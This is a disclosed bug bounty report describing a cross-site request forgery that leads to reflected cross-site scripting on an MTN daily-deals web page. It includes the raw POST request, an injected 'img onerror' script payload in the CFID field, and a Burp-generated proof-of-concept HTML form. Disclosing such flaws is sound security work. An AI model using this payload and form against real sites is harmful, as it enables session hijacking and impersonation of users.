# Cross-Site Request Forgery (CSRF) to xss

## Report Details
- **Report ID**: 1183241
- **URL**: https://hackerone.com/reports/1183241
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-05-03T19:06:17.167Z
- **Disclosed**: 2022-10-30T21:54:55.304Z

## Reporter
- **Username**: lu3ky-13
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mtn_group

## Vulnerability Information
hello dear support

i have found csrf to xss on https://dailydeals.mtn.co.za/index.cfm?GO=DEALS

URL:https://dailydeals.mtn.co.za/index.cfm?GO=DEALS

URL encoded POST input CFID was set to fbe8c86c-c0b2-4421-8ca2-dcfc14763d6e"><img src=x onerror=alert(document.domain)>

HTTP request
============
POST /index.cfm?GO=DEALS HTTP/1.1
Host: dailydeals.mtn.co.za
Cookie: EBSAuthCookie=15302|||N; TS011bbda7=014f25e894c21e6b965792d5df17dd4ba82e1424b80a3aa2fbd660ae991db17501f4bbd59e45568e30ca4fffd17a7b0b225c8e53dd; cfid=3283cef9-4136-403d-ae30-fa9a875b1da3; cftoken=0
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Origin: https://dailydeals.mtn.co.za
Referer: https://dailydeals.mtn.co.za/index.cfm?GO=DEALS
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

CFID=fbe8c86c-c0b2-4421-8ca2-dcfc14763d6e%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29%3E&CFTOKEN=0&category_id=9&cpID=1&location_id=0&m=1


Csrf Poc
=========

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://dailydeals.mtn.co.za/index.cfm?GO=DEALS" method="POST">
      <input type="hidden" name="CFID" value="fbe8c86c&#45;c0b2&#45;4421&#45;8ca2&#45;dcfc14763d6e&quot;&gt;&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;document&#46;domain&#41;&gt;" />
      <input type="hidden" name="CFTOKEN" value="0" />
      <input type="hidden" name="category&#95;id" value="9" />
      <input type="hidden" name="cpID" value="1" />
      <input type="hidden" name="location&#95;id" value="0" />
      <input type="hidden" name="m" value="1" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

## Impact

Malicious JavaScript has access to all the same objects as the rest of the web page, including access to cookies and local storage, which are often used to store session tokens. If an attacker can obtain a user's session cookie, they can then impersonate that user.

Furthermore, JavaScript can read and make arbitrary modifications to the contents of a page being displayed to a user. Therefore, XSS in conjunction with some clever social engineering opens up a lot of possibilities for an attacker

## Attachments
No attachments
